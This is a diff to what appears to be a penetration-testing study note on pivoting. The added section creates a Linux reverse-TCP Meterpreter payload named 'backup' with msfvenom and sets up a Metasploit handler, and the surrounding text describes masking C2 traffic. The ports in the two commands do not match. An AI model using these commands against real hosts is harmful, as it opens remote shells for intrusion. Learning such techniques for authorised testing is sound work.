@@ -46,7 +46,20 @@ Socket Secure (*SOCKS*) is a protocol for communicating with servers when firewa
 ## Tunnelling
 Tunnelling is when we *encapsulate traffic in another protocol and route traffic through it*. VPNs are an example of tunnelling. This is particularly useful for evading detection systems where we need to discretely pass traffic in/out of a network (eg. using HTTPS to mask our C2 traffic). 
 ### Tunnelling with Meterpreter
+1. We need to first create a payload for the pivot host (*this example creates a reverse tcp meterpreter shell which will connect back to port 8080 on our machine*)
+```sh
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack_host_IP> -f elf -o backup LPORT=8080
+```
+2. Next we need to setup a *Generic Payload Handler* (`multi/handler`)
+```sh
+msf6 > use exploit/multi/handler
+> set payload linux/x64/meterpreter/reverse_tcp
+> set lhost 0.0.0.0
+> set lport 8000
+> run
 
+[*] Started reverse TCP handler on https://0.0.0.0:8000
+```
 
 ## Port Forwarding
 Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.
